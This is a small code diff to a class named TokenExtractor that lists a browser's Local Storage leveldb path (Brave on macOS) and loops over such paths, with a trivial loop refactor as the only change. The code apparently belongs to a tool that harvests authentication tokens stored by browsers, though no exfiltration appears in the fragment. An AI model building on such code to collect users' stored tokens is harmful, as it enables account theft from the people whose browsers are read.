@@ -91,7 +91,7 @@ class TokenExtractor:
                 "Brave": f"{home}/Library/Application Support/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb/"
             }
 
-        for name, path in list(paths.items()):
+        for name, path in paths.items():
             if not os.path.exists(path):
                 continue
             
